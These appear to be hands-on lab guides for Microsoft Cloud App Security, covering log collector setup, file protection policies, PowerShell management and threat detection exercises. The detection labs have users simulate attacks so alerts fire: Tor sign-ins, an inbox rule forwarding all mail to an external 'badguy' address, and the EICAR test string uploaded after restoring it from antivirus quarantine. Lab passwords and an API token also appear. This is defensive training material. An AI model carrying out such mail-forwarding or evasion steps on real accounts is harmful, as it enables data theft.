    ![Download sample](\Media\dis-downloadsample.png "Download sample log")

8. Close the *Verify your log format* window, then click **Add** in the **Add** data source dialog.

    ![Add source](\Media\dis-addsource.png "Add source")

    >**INFO:** We just created a data source which is the logical representation of the network appliance data source type the log collector will receive.

9. Next, click on the **Log collectors tab** and click the **Add log collector...** button.

    ![Add log collector](\Media\dis-addlogcollector.png "Add log collector")

10. In the Create log collector dialog, provide the settings below and click the **Update** button.

    |||
    |-----|-----|
    |Name|```LogCollector```
    |Host IP address|```192.168.141.125```
    |Data source(s)|**SquidLogs**

    ![Create log collector](\Media\dis-createlogcollector.png "Create log collector")

11. After clicking on the **Update** button, you have now the required steps to create your log collector instance on **LinuxVM**.
    >:warning: Do not close this window!

    ![Create log collector command](\Media\dis-addlogcollectortoken.png "Create log collector command")

    ``` bash
    (echo 1f5b5fb2a0d778e3d57f26ca5ab11574db0751166477940528ccf19a7c4) | docker run --name LogCollector -p 21:21 -p 20000-20099:20000-20099 -e "PUBLICIP='192.168.141.125'" -e "PROXY=" -e "SYSLOG=false" -e "CONSOLE=xyztenant.eu.portal.cloudappsecurity.com" -e "COLLECTOR=LogCollector" --security-opt apparmor:unconfined --cap-add=SYS_ADMIN --restart unless-stopped -a stdin -i microsoft/caslogcollector starter
    ```

    >**INFO:** This command line contains the different parameters to instantiate a new log collector on the Linux host:
    >* An API token to connect to Cloud App Security for uploading the logs: *1f5b5fb2a0d778e3d57f26ca5ab11574db0751166477940528ccf19a7c4*
    >* The docker parameters to configure the log collector container: *docker run ...*

12. Copy the command line provided at the end of the previous step and **minimize** the browser. Open **Putty (64-bit)**. You should have the icon on your desktop.

    ![Putty](\Media\dis-putty.png "Putty")

13. In the PuTTY Configuration window, enter **192.168.141.125** and click **Open**.

    ![Putty config](\Media\dis-puttyconfig.png "Putty config")

14. At the Putty warning message, click **Yes**.
    >**INFO:** This warning is due to the ssh certificate. You can safely ignore this warning in this lab.

    ![Putty warning](\Media\dis-puttywarning.png "Putty warning")

15. Log in using the credentials below.
    >|Username|Password|
    >|---|---|
    >|```user01```|```Passw0rd1```|
    >
    >:warning:The password doesn't appear in the command prompt, you can safely press enter to validate the credentials.

    ![Putty prompt](\Media\dis-puttylogin.png)

16. Type the command below and press **Enter**. Provide the user password when prompted.
    ``` bash
    sudo -i
    ```
    ![sudo](\Media\dis-sudo.png)
    >**INFO**: The previous command elevates your permissions in the Linux environment like the UAC prompt would do on a Windows machine.

17. Return to the *Create log collector* dialog, copy the **collector configuration** command from step 2 and run it in the PuTTY window.

    ![Copy token](\Media\dis-addlogcollectorcopy.png "Copy token")
    ![New container](\Media\dis-newcontainer.png "New container")
    >**INFO:** The output of this command is the id of the newly created container/log collector.

18. Now, launch **WinSCP** from the start-menu.

    ![WinSCP](\Media\dis-winscp.png "WinSCP")

19. Use the details below in the WinSCP window to connect to the log collector FTP service.

    |File Protocol|Host name|User name|Password|
    |-----|-----|-----|-----|
    |**FTP**|```192.168.141.125```|```discovery```|```BP98Jw4Ns*zpTFrH```|

    ![WinSCP connection](\Media\dis-winscpconnection.png "WinSCP connection")

    >**INFO**: this information was provided during the log collector creation.
    >
    >:memo: **NOTE:** the password is common to every new log collector. To change it, follow [this guide](https://docs.microsoft.com/en-us/cloud-app-security/troubleshoot-docker#docker-deployment) in the documentation.

    You should then be able to see a folder with your data source name.

    ![WinSCP connection](\Media\dis-winscpfolder.png "WinSCP connection")

    >:warning: If you are **not** able to connect to the log collector FTP service, verify that you successfully created the new log collector instance within Putty in previous steps.

20. On the left pane, move to the **Desktop** folder and drag your example Squid log (From Step 7) into the folder named for your data source (**SquidLogs**). After some minutes, the log collector will upload your logs.

    ![Log upload](\Media\dis-winscplogupload.png "Log upload")
    ![Log upload](\Media\dis-winscplogupload2.png "Log upload")
    ![Log upload](\Media\dis-winscplogupload3.png "Log upload")

21. Return to the Cloud App Security portal and click on **Settings** > **Governance log**.

    ![Settings Governance log](\Media\dis-governancelog.png "Settings Governance log")

22. Verify the status of the uploaded logs.

    >**INFO:** The status you see is the parsing status of the logs. Parsing status can be successful, pending or failed.

    ![Log uploaded](\Media\dis-loguploaded.png "Log uploaded")

23. You can also verify the **last data received** status on the *Data sources* tab under **Automatic log upload** settings.

    ![Last data received](\Media\dis-lastreceived.png "Last data received")

24. Go to the **Cloud Discovery dashboard** to verify the discovered apps.

    ![Discovery dashboard](\Media\dis-discoverydashboard.png "Discovery dashboard")

    ![Discovery data](\Media\dis-discoverydata.png "Discovery data")

    >:memo: **NOTE:**  After validating that your logs have been successfully uploaded and processed by MCAS, you will not usually see directly the analysis of your data. Why?
    >
    >**ANSWER:** Cloud Discovery logs are only parsed **twice a day**.
===
# Information protection

[:arrow_left: Home](#labs)

In a perfect world, all your employees understand the importance of information protection and work within your policies. But in a real world, it's probable that a partner who works with accounting uploads a document to your Box repository with the wrong permissions, and a week later you realize that your enterprise's confidential information was leaked to your competition.
Microsoft Cloud App Security helps you prevent this kind of disaster before it happens.

## Labs

* [Apply AIP classification to SSN documents:](#Apply-AIP-classification-to-SSN-documents) :clock10: 10 min
* [Quarantine sensitive PDF for review:](#Quarantine-sensitive-PDF-for-review) :clock10: 10 min
* [Test our policies:](#Test-our-policies) :clock10: 10 min

---

## Apply AIP classification to SSN documents

In this task, you will protect a specific sensitive document library in SharePoint Online using the native integration with Azure Information Protection.
We will apply an Azure Information Protection template on documents containing social security numbers.

[:arrow_up: Top](#Information-protection)

1. In the Cloud App Security portal, go to **Policies**.

    ![Policies](\Media\info-policies.png "Policies")

2. Create a new **File policy**.

    ![New policy](\Media\info-newpolicy.png "New policy")

3. Provide the following settings to that policy:

    >|||
    >|---------|---------|
    >|Policy Name| **Protect SSN documents in sensitive site**|
    >|Files matching all of the following| **remove the filters** |
    >|Apply to| **selected folder**|
    >:memo: Here, select the **Shared Documents** folder from the default SharePoint site.

    ![Policy filter](\Media\info-filter.png "Policy filter")

    ![Select folder](\Media\info-folder.png "Select folder")

4. Verify that you have one selected folder and click on **Done**.

    ![Done](\Media\info-done.png "Done")

    ![Folder](\Media\info-folder.png "Folder")

5. In inspection method, select **Data Classification Service**.

    >:memo: [Microsoft Data Classification Service](https://docs.microsoft.com/en-us/cloud-app-security/dcs-inspection) provides a **unified** information protection experience across Office 365, Azure Information Protection, and Microsoft Cloud App Security.
    >The classification service allows you to extend your data classification efforts to the third-party cloud apps protected by Cloud App Security, using the decisions you already made across an even greater number of apps.

    ![DCS](\Media\info-dcs.png "DCS")

6. Click on **Choose inspection type** and then on **sensitive information type**. Search and select the **SSN related** ones and click on **Done**.

    ![SSN type](\Media\info-type.png "SSN type")
    ![SSN type](\Media\info-ssn.png "SSN type")

7. Click on the **Unmask** checkbox.

    ![Unmask](\Media\info-unmask.png "Unmask")

8. In the Governance actions, click on **Microsoft SharePoint Online** and select **Apply classification label**.

    ![Template](\Media\info-template.png "Template")

    >:warning: If you are not able to select Azure Information Protection templates, verify that you configured the integration in the prerequisites section or that you waited the 1h for the classifications to sync.

9. Click **Create** to finish the policy creation.

---

## Quarantine sensitive PDF for review

[:arrow_up: Top](#Information-protection)

File policies are a great tool for finding threats to your information protection policies, for instance finding places where users stored sensitive information, credit card numbers and third-party ICAP files in your cloud. With Cloud App Security, not only can you detect these unwanted files stored in your cloud that leave you vulnerable, but you can take im/mediate action to stop them in their tracks and lock down the files that pose a threat. Using Admin quarantine, you can protect your files in the cloud and re/mediate problems, as well as prevent future leaks from occurring.
This is what we are going to configure in this lab.

1. In Cloud App Security, go to the **Settings**.

    ![Settings](\Media\info-settings.png)

2. In the Information Protection section, go to **Admin quarantine**.

    ![Settings admin quarantine](\Media\info-adminq1.png "Settings admin quarantine")

3. Configure **Admin quarantine**.

    * In the dropdown menu, select your root SharePoint site.

    ![Settings admin quarantine site](\Media\info-adminq2.png "Settings admin quarantine site")

    >:memo: As best practice, you should create and use a **dedicated** site with restricted access as the admin quarantine location.

    * In user notification, type **Your content has been quarantined. Please contact your admin.** and click on the **Save** button.

    ![Settings admin quarantine message](\Media\info-adminq3.png "Settings admin quarantine message")

    >:memo: This message will be provided in the placeholders when a file is put in quarantine.

4. Next, go to the policies menu and create a new **file policy**. The policy is the component that will decide which files should be put in quarantine.

    ![Policies](\Media\info-policy1.png "Policies")

    ![New policy](\Media\info-policy2.png "New policy")

5. Provide the following settings to that policy:

    >|Policy name|Files matching all of the following|
    >|---------|---------|
    >|Quarantine sensitive pdf| Extension equals pdf|

    ![New policy](\Media\info-policy3.png "New policy")

6. Check the **Create an alert for each matching file** checkbox. In Governance actions of the policy, select **Put in admin quarantine** for OneDrive and SharePoint and click on the **Create** button.

    ![New policy](\Media\info-policy4.png "New policy")

---

## Test our policies

[:arrow_up: Top](#Information-protection)

To test our files policies, perform the following tasks:

1. On Client01, unzip the content of the **Demo files.zip**.

2. Go to the **Contoso Team Site** documents library. You can use the **Search** to find the address to this site.

    ![Team site](\Media\info-test1.png "Team site")

    ![Team site](\Media\info-test2.png "Team site")

    ![Team site](\Media\info-test3.png "Team site")

    ![Team site](\Media\info-test4.png "Team site")

3. Upload the unzipped files to the site.

    ![Upload](\Media\info-test5.png "Upload")

    ![Upload](\Media\info-test6.png "Upload")

    ![Upload](\Media\info-test7.png "Upload")

4. Cloud App Security will now scan those documents and search for matches to our created policies.

    >:memo: The scan can take **several minutes** before completion.

5. To monitor the evolution of the scan, go back to Cloud App Security and open the **Files** page of the investigations.

    ![Search files](\Media\info-files1.png "Search files")

6. You can search for the files you uploaded using different criteria, like **file name**, **type**, ... or just look at all the files discovered by Cloud App Security.

    ![Search files](\Media\info-files2.png "Search files")

    >:memo: The search page do not refresh automatically.

7. When a policy match is discovered, you will see it in this page.

    >:memo: Next to the file name, you have icons showing that an AIP label was applied and that we have a policy match.

    ![Policy match](\Media\info-files3.png "Policy match")

8. To open the details of the file, click on its name. You can see there the matched policies and the scan status of the files.

    ![Policy match](\Media\info-files4.png "Policy match")

    ![Scan status](\Media\info-files5.png "Scan status")

9. You can also view the related governance actions, like applying the Azure Information classification or moving the file to the quarantine folder, at the file level or in the **Governance log**.

    ![File governance](\Media\info-files6.png "File governance")

    ![Governance log](\Media\info-governance.png "Governance log")

    ![Governance action](\Media\info-files7.png "Governance action")

10. If you go back to the **Contoso Team Site**, you will also notice that the quarantined files will be replaced by placeholders containing your custom message. The original file will be moved to the "Quarantine" location we defined in the settings.

    ![Site](\Media\as3niznc.jpg "Site")

    ![Placeholder](\Media\juas1s58.jpg "Placeholder")

    ![Quarantine](\Media\drm0yj0c.jpg "Quarantine")
===
# Cloud App Security threat detection lab

[:arrow_left: Home](#labs)

Cloud App Security provides several [threats detection policies](https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy) using machine learning and **user behavior analytics** to detect suspicious activities across your different applications.
Those policies are enabled by default and after an initial learning period, Cloud App Security will start alerting you when suspicious actions like activity from anonymous IP addresses, infrequent country, suspicious IP addresses, impossible travel, ransomware activity, suspicious inbox forwarding configuration or unusual file download are detected.
In this lab, we will perform some malicious actions that Cloud App Security will detect. As some detections require learning about your users’ behavior, we will focus on the ones you can simulate during this lab.

## Prerequisites

### Tools

To simulate user access from anonymous IPs, we will use TOR browser.
Go to the [TOR project website](https://www.torproject.org/projects/torbrowser.html.en#downloads) to download the Windows version and install it.
You should find the shortcut on your desktop:

![TOR browser icon](\Media\td-toricon.png "TOR browser")

> :warning: This tools is for research purposes only. Microsoft does **not** own this tool
> nor can it guarantee its behavior. This tools should only be run in a test lab environment.

## Environment

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

:warning: As your environments auditing might not be configured yet and will take up to **24h** before being enabled, the alerts related investigations will be performed **in the environment provided by your instructor**. Credentials are provided below.
Search and review the alerts in that environment and investigate to identify the users and the malicious activities performed.

|Portal               |Username                   |Password
|----------------- |----------------------------------- |---------------------
| https://portal.cloudappsecurity.com | viewer@emslab.tech |EventP@ssword

### URLs

* Office 365: https://portal.office.com
* Cloud App Security: https://portal.cloudappsecurity.com
* Windows Defender ATP: https://securitycenter.windows.com

### Users

| User          | Username                      | Password       |
| ----          | --------                      | --------       |
| Admin |admin@xyztenant.onmicrosoft.com  | * |
| Amy Albers   |amy@xyztenant.onmicrosoft.com | * |
| Eric Gruber  |eric@xyztenant.onmicrosoft.com | * |

## Labs

* [Anonymous access:](#Anonymous-access) :clock10: 5 min
* [Impossible travel:](#Impossible-travel) :clock10: 5 min
* [Activity from infrequent country:](#Activity-from-infrequent-country) :clock10: 5 min
* [Malware detection:](#Malware-detection) :clock10: 5 min
* [Email exfiltration using suspicious inbox forwarding:](#Email-exfiltration-using-suspicious-inbox-forwarding) :clock10: 5 min
* [Ransomware activity:](#Ransomware-activity) :clock10: 5 min
* [Suspicious application consent:](#Suspicious-application-consent) :clock10: 5 min

---

## Anonymous access

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

This detection identifies that users were active from an IP address that has been identified as an anonymous proxy IP address. These proxies are used by people who want to hide their device’s IP address, and may be used for malicious intent. This detection uses a machine learning algorithm that reduces "false positives", such as mis-tagged IP addresses that are widely used by users in the organization.

### Simulate the malicious activity

1. On your Windows 10 lab VM, open TOR browser:

   ![Connect to TOR](\Media\td-torlaunch.png "Connect to TOR")

2. Open Office 365 web mail by going to https://outlook.office.com and enter Eric Gruber credentials.

3. Go to the **Contoso Team Site** and download some documents.

### Investigate

As your authentication during the previous steps came from an anonymous IP address, it will be detected as suspicious by Cloud App Security.

1. Go back to the Cloud App Security portal and review the alerts.

   ![MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   ![TOR alert](\Media\td-toralert.png "TOR alert")

2. Click on the alert to open it.
   You see in this page more information on the alert and the related activities:

   ![TOR alert](\Media\td-toralert-details.png "TOR alert details")

3. Click on the activities to get more information on the specific activity, the user and the IP address:

   ![TOR alert](\Media\td-toralert-details-user.png "TOR alert user")
   ![TOR alert](\Media\td-toralert-details-ip.png "TOR alert IP address")

4. You can go further in your investigation by looking at the related actions performed during that session by clicking on the “investigate in activity log" button:

   ![TOR alert](\Media\td-toralert-details-activities.png "TOR alert activities")

5. You will then be redirected to the activity log where you will be able to investigate on the actions performed during that session, like configuration changes or data exfiltration.

---

## Impossible travel

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

This detection identifies two user activities (is a single or multiple sessions) originating from geographically distant locations within a time period shorter than the time it would have taken the user to travel from the first location to the second, indicating that a different user is using the same credentials. This detection uses a machine learning algorithm that ignores obvious "false positives" contributing to the impossible travel condition, such as VPNs and locations regularly used by other users in the organization. The detection has an initial learning period of seven days during which it learns a new user’s activity pattern.

### Simulate the malicious activity

1. In your Windows 10 lab VM, open Office 365 web mail by going to https://outlook.office.com and enter Amy Albers credentials. This authentication will come from an Azure IP address, where your client is hosted.

2. On your host PC, go to https://outlook.office.com and authenticate again as Amy Albers.

### Investigate

As the first and the second authentication came from distinct locations, Cloud App Security will detect that those time to travel between those two locations was to short and will then alert you.

1. Go back to the Cloud App Security portal and review the alerts.

   ![MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   ![Impossible travel alert](\Media\td-impossibletravelalert.png "Impossible travel alert")

2. The investigation steps are similar to the anonymous access but by looking at the IP address details and the **ISP**, you will be able to determine the possible risk:

   ![Impossible travel alert](\Media\td-impossibletravelalert-details.png "Impossible travel alert details")

---

## Activity from infrequent country

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

This detection considers past activity locations to determine new and infrequent locations. The anomaly detection engine stores information about previous locations used by users in the organization. An alert is triggered when an activity occurs from a location that wasn't recently or never visited by any user in the organization.

### Investigate

After an initial learning period, Cloud App Security will detect that this location was not used before by your user or other people within the organization and will then alert you.

1. Go back to the Cloud App Security portal and review the alerts.

   ![MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   ![Infrequent country alert](\Media\td-infrequentcountryalert.png "Infrequent country alert")

2. The investigation steps are similar to the anonymous access but by looking at the IP address details and the ISP, you will be able to determine the possible risk. In this specific example, we see it’s coming from a TOR IP, so this authentication is suspicious:

   ![Infrequent country alert](\Media\td-infrequentcountryalert-details.png "Infrequent country alert details")

---

## Malware detection

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

This detection identifies malicious files in your cloud storage, whether they're from your Microsoft apps or third-party apps. Microsoft Cloud App Security uses Microsoft's threat intelligence to recognize whether certain files are associated with known malware attacks and are potentially malicious. This built-in policy is disabled by default. Not every file is scanned, but heuristics are used to look for files that are potentially risky. After files are detected, you can then see a list of **Infected files**. Click on the malware file name in the file drawer to open a malware report that provides you with information about that type of malware the file is infected with.

### Simulate the malicious activity

1. In your Windows 10 lab VM, create a new text file __*test-malware.txt*__ with the following content:

   ``` txt
   X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
   ```

   > **INFO:** The file we just created is an [EICAR test file](http://www.eicar.org/86-0-Intended-use.html) usually used to test anti-viruses.

2. This file will normally trigger an antivirus alert and quarantine the file. If this is the case, go to the Windows Security Center and restore it:

   ![Security Center](\Media\td-winsecuritycenter.png "Windows Security Center")

3. Go to https://portal.office.com and enter Amy Albers credentials. Go to OneDrive for Business:

   ![App launcher](\Media\td-officeapplauncher.png "Office apps launcher")

   ![Office apps](\Media\td-officeapps.png "Office apps")

4. Upload the __*test-malware.txt*__ file you created in OneDrive:

   ![OneDrive upload](\Media\td-onedriveupload.png "OneDrive upload")

   ![OneDrive malware](\Media\td-testmalwarefile.png "OneDrive malware")

5. After a few minutes, the file will be detected as a malware and an alert will be triggered in Cloud App Security:

   ![Malware detected](\Media\td-malwaredetected.png "Malware detected")

### Investigate

1. Go back to the Cloud App Security portal and review the alerts.

   ![MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   ![Malware detected alert](\Media\td-malwarealert.png "Malware detected alert")

2. Click on the alert to open it. You see in this page more information on the alert and the related activities:

   ![Malware detected alert](\Media\td-malwarealert-details.png "Malware detected alert")

3. In the alert, you have more information on the file and its location, but also the malware that we identified:

   ![Malware family](\Media\td-malwarefamily.png "Malware family")

4. Click on the malware type link to have access to the Microsoft Threat Intelligence report regarding this file:

   ![Malware family](\Media\td-malwarefamilymti.png "Malware family")

5. Back in the alert, you can scroll down to the related activities. There, you will have more information on how the file was uploaded to OneDrive and possibly who downloaded it:

   ![Malware family](\Media\td-malwarealert-activities.png "Malware family")

---

## Email exfiltration using suspicious inbox forwarding

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

This detection looks for suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address.

### Simulate the malicious activity

1. On your Windows 10 lab VM, open TOR browser.

2. Open Office 365 web mail by going to https://outlook.office.com and enter Eric Gruber credentials.

3. Click on the “People” icon:

   ![Exchange menu](\Media\td-exomenu.png "Exchange menu")

4. Create a new contact and save it:

   |First name |  Last Name | Email          | Display as|
   |:----------|:-----------|:---------------|:----------|
   | .         | .          | badguy@xyz.com | .         |
   ![Create contact](\Media\td-createcontact.png "Create contact")

5. Now go to the __*Mail*__ settings:

   ![Exchange settings](\Media\td-exosettings.png "Exchange settings")

6. Go to __*Inbox and sweep rules*__ and create a new forwarding rule:

   ![Inbox rules](\Media\td-inboxrules.png "Inbox rules")

7. Create this rule and select the contact you created before as the recipient:

   | Apply to all messages | Select the contact you created | Click **OK** to save          |
   |:----------|:-----------|:---------------|
   | ![Inbox rules](\Media\td-newinboxrules01.png "Inbox rules") | ![Inbox rules](\Media\td-newinboxrules02.png "Inbox rules") | ![Inbox rules](\Media\td-newinboxrules03.png "Inbox rules") |

### Investigate

As the rules redirects your user’s emails to a suspicious external address, Cloud App Security will detect this rule creation and will then alert you.

1. Go back to the Cloud App Security portal and review the alerts.

   ![MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   ![Suspicious forwarding alert](\Media\td-suspiciousforwardingalert.png "Suspicious forwarding alert")

2. Click on the alert to open it. You see in this page more information on the alert, like the **destination address** and the related activities:

   ![Suspicious forwarding alert](\Media\td-suspiciousforwardingalert-details.png "Suspicious forwarding alert")

3. With this information, you can now go back to the user to remove this rule but also investigate in Exchange trace logs which emails were sent to that destination address.

---

## Ransomware activity

Cloud App Security extended its ransomware detection capabilities with anomaly detection to ensure a more comprehensive coverage against sophisticated Ransomware attacks. Using our security research expertise to identify behavioral patterns that reflect ransomware activity, Cloud App Security ensures holistic and robust protection. If Cloud App Security identifies, for example, a high rate of file uploads or file deletion activities it may represent an adverse encryption process. This data is collected in the logs received from connected APIs and is then combined with learned behavioral patterns and threat intelligence, for example, known ransomware extensions. For more information about how Cloud App Security detects ransomware, see Protecting your organization against ransomware.

>:memo:**NOTE:** For security reasons, we will note detail in this lab how to simulate ransomware attacks

### Investigate

As the rules redirects your user’s emails to a suspicious external address, Cloud App Security will detect this rule creation and will then alert you.

1. Go back to the Cloud App Security portal and review the alerts.

   ![MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   ![Ransomware alert](\Media\td-ransomwarealert.png "Ransomware alert")

2. Click on the alert to open it. You see in this page more information on the impacted user, the number of encrypted files, the location of the files and the related activities:

   ![Ransomware alert](\Media\td-ransomwarealert-details.png "Ransomware alert")

3. Now that we’ve seen the alert, let’s go back to the policies:

   ![Policies](\Media\td-policies.png "Policies")

4. Search for the “Ransomware activity” policy and open it:

   ![Ransomware policy](\Media\td-policiesransomware.png "Ransomware policies")

5. At the bottom of the policy, review the possible alerts and governance actions:

   ![Ransomware policy](\Media\td-policiesransomware-governance.png "Ransomware policies")

---

## Suspicious application consent

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

Many third-party productivity apps that might be installed by business users in your organization request permission to access user information and data and sign in on behalf of the user in other cloud apps, such as Office 365, G Suite and Salesforce. 
When users install these apps, they often click accept without closely reviewing the details in the prompt, including granting permissions to the app. This problem is compounded by the fact that IT may not have enough insight to weigh the security risk of an application against the productivity benefit that it provides.
Because accepting third-party app permissions is a potential security risk to your organization, monitoring the app permissions your users grant gives you the necessary visibility and control to protect your users and your applications. The Microsoft Cloud App Security app permissions enable you to see which user-installed applications have access to Office 365 data, G Suite data and Salesforce data, what permissions the apps have, and which users granted these apps access to their Office 365, G Suite and Salesforce accounts. 

Here is an example of such user consent:

![App consent](\Media\td-appconsent.png "App consent")

### Investigate

1. Without even creating policies, Cloud App Security shows you the applications that received permissions from your users:

   ![App permissions](\Media\td-oauth.png "App permissions")

2. From this page, you can easily see who granted permissions to those apps, if they are commonly used or their permissions level:

   ![App commodity](\Media\td-zapiercommodity.png "App commodity")

3. If you detect that an application should not be granted access to your environment, you can revoke the app access.
   > **IMPORTANT:** This operation will apply to the **entire** organization:

   ![App revoke](\Media\td-apprevoke.png "App revoke")

4. When investigating, you can search for apps rarely used in Office 365 which were granted high privileges and create a **policy** to be automatically alerted when such action is performed:

   ![App filter](\Media\td-appfilter.png "App filter")

5. After clicking on the “New policy from search” button, you can see that your filter will be used to create a new policy:

   ![App policy](\Media\td-apppolicy.png "App policy")

6. Go down on that page and review the possible alerts and governance automatic actions that you can configure:

   ![App policy](\Media\td-apppolicy-governance.png "App policy")

7. To go further in your investigation, let’s now pivot to the “Activity log”:

   ![Activity log](\Media\td-activitylog.png "Activity log")

8. In the activity log, search for "**Consent to application**" activities:

   ![Activity log](\Media\td-activitylog-consent01.png "Activity log")

9. You will then be able to investigate on who, when and from where your users granted access to applications:

   ![Activity log](\Media\td-activitylog-consent02.png "Activity log")

---

## Create your own policies

[:arrow_up: Top](#Cloud-App-Security-threat-detection-lab)

Now that we reviewed some of the default detection capabilities of Cloud App Security, you should start creating your [own policies](https://docs.microsoft.com/en-us/cloud-app-security/control-cloud-apps-with-policies).
Cloud App Security provides by default many [policies templates](https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference) to start creating your custom policies.

1. To create your policies, go to “Policies”:

   ![Policies](\Media\td-policies.png "Policies")

2. Click on “Create policy” and select the type of policy you want to create:

   ![Policies types](\Media\td-policiestypes.png "Policies types")

3. In the policy screen, choose the policy template you want to use:

   ![Policies templates](\Media\td-policiestemplates.png "Policies templates")

4. Apply the template:

   ![Apply template](\Media\td-applytemplate.png "Apply template")

5. Cloud App Security will then populate the different properties of the policy:

   ![Policy template filter](\Media\td-policytemplatefilter.png "Policy template filter")

6. Review those properties and customize them if needed.

7. Explore other types of policies and review the proposed templates.

 **To go further in your Cloud App Security journey, join our [tech community](https://techcommunity.microsoft.com/t5/Microsoft-Cloud-App-Security/bd-p/MicrosoftCloudAppSecurity) !**

===
# Management

[:arrow_left: Home](#labs)

[Cloud App Security PowerShell module:](#Cloud-App-Security-PowerShell-module) :clock10: 20 min

## Cloud App Security PowerShell module

[:arrow_up: Top](#Management)

To help administrators interact with MCAS in a programmatic way, two
Microsoft employees created a non-official PowerShell module for Cloud
App Security. For this lab, you will install this module and discover
the available cmdlets.

Note: the module relies on the Cloud App Security API. You can find its
documentation in the MCAS portal.

![f847xhzx.jpg](\Media\f847xhzx.jpg)

The module is available in the PowerShell gallery and can be installed
using the *Install-Module mcas* command.

![6j16dgs2.jpg](\Media\6j16dgs2.jpg)

More information on the module is available on GitHub:
[https://github.com/powershellshock/MCAS-Powershell](https://github.com/powershellshock/MCAS-Powershell)

After installing the module, read how to connect to MCAS in the
PowerShell help and start exploring the cmdlets.

Hint: you'll have to create an API token in Cloud App Security.

![0x2tzeqd.jpg](\Media\0x2tzeqd.jpg)

Using PowerShell:

1.  Review the list of MCAS administrators and when they were granted
    those permissions

2.   Review your security alerts and close them in bulk

3.   Download a sample SQUID log and send it to MCAS as a snapshot
    report.

4.   In the portal, in Discovery, tag some apps as unsanctioned and
    generate a blocking script for your appliance to block access to
    those apps.

5.   You are asked to define corporate IP's in MCAS. Subnets go from
    10.50.50.0/24 to 10.50.80.0/24
===
# Cloud App Security Discovery lab

[:arrow_left: Home](#labs)

## Labs

* [Create and review a snapshot reports:](#Configure-and-test-continuous-reports) :clock10: 10 min

---

## Create and review a snapshot reports

[:arrow_up: Top](#Cloud-App-Security-Discovery-lab)

Snapshot Reports are the manual method of uploading files into Cloud App Security. You can upload batches of 20 logs of 1 GB max at a time and they will parse into their own separate report. Any discovery policies you create **will not** apply to these types of reports. Creating Snapshot reports is a great and easy way to validate your logs format of have a quick look at the Cloud App Security Discovery capability.

To create snapshot reports:

1. Go to the **Discover** section and click on **Create snapshot report**.

    ![Create snapshot](\Media\dis-newsnaphsot.png "Create snapshot")

2. In the Add data source window, use the settings below (do not close the window yet) and click on **View and verify...**:

    >|||
    >|---------|---------|
    >|Report Name| **Demo report**|
    >|Description| |
    >|Data Source| **Barracuda - F-Series Firewall**|
    >|Anonymize private information |**Check the box**|
    >
    ![New snapshot](\Media\dis-createsnapshot.png "New snapshot")

3. In the **Verify your log format** window, click on the **Download sample log** button and save it to your desktop.

    ![Download log](\Media\dis-downloadlog.png "Download log")

4. Close that window.

5. Click on the **Browse** button and in the new window, select the log you downloaded and click **Open**.

    ![Browse logs](\Media\dis-browse.png "Browse logs")

    ![Select logs](\Media\dis-selectlogs.png "Select logs")

6. Now that the log has been selected, click on the **Create** button to create your report.

    ![Create snapshot](\Media\dis-snapshotcreate.png "Create snapshot")

7. Your report will then be processed.

    ![Report processing](\Media\dis-processing.png "Report processing")

8. When your report is ready, you can click on it and start exploring the discovered apps, users, IPs.

    ![Report dashboard](\Media\dis-dashboard.png "Report dashboard")

    ![Report dashboard -risk](\Media\dis-risk.png "Report dashboard - risk")
===
# Cloud App Security Discovery lab

[:arrow_left: Home](#labs)

## Labs

* [How to troubleshoot the Docker log collector:](#How-to-troubleshoot-the-Docker-log-collector) :clock10: 15 min

---

## How to troubleshoot the Docker log collector

[:arrow_up: Top](#Cloud-App-Security-Discovery-lab)

In this task, you will review possible troubleshooting steps to identify issues in automatic logs upload from the log collector.
There are several things to test at different locations: in the log collector, in MCAS, at the network level.

### Useful commands

* `cd` : *Used to navigate in the directories*
    >**Examples:**
    >
    >`cd /var/adallom` : *to go to the specified directory*
    >
    >`cd /` : *to go to the root directory*
    >
    >`cd ..` : *to go to the parent directory*

* `more` or `cat` : *Used to display the content of the logs*
    > **Examples:**
    >
    >`more trace.log` : *to display the content of the trace.log file*

* `tail` : *Used for outputting the last part of files*

* `ll` : *Used to display the content of the directory as a list*. This command is an alias for `ls -l`

* `clear` : *Used to clear the screen*

* `tab key` : Used to perform autocompletion

### Verify the log collector (container) status

1. On **Client01**, open a session on PuTTY to **192.168.141.125** and use the credentials below.
    In the PuTTY Configuration window, enter **192.168.141.125** and click **Open**.

    ![Putty config](\Media\dis-puttyconfig.png "Putty config")

    Log in using the credentials below.
    >|Username|Password|
    >|---|---|
    >|user01|Passw0rd1|
    >
    >:warning:The password doesn't appear in the command prompt, you can safely press enter to validate the credentials.

2. Run the following commands:

    ``` bash
    sudo -i
    docker stats
    ```
    ![Docker stats](\Media\dis-dockerstats.png "Docker stats")

     >**INFO:** This command will show you the status of the log collector instance.

3. Press `Ctrl-C` to end the command.

4. Next, run the command below:

    ``` bash
    docker logs --details LogCollector
    ```
    ![Docker log](\Media\dis-dockerlog.png "Docker log")

     >**INFO:** This command will show you the container logs to verify if it encountered errors when initiating.

### Verify the log collector logs

1. Type the following command:

    ``` bash
    docker exec -it LogCollector bash
    ```
     >**INFO:** This command will execute the container's bash. You will then be able to execute commands *from inside* of the log collector.

2. You can now explore the container filesystem and inspect the **/var/adallom** directory. This directory is where you will investigate most of the issues with the syslog or ftp logs being sent to the log collector.

    ``` bash
    cd /var/adallom
    ll
    ```

    ![adallom folder](\Media\dis-dockerll.png "adallom folder")

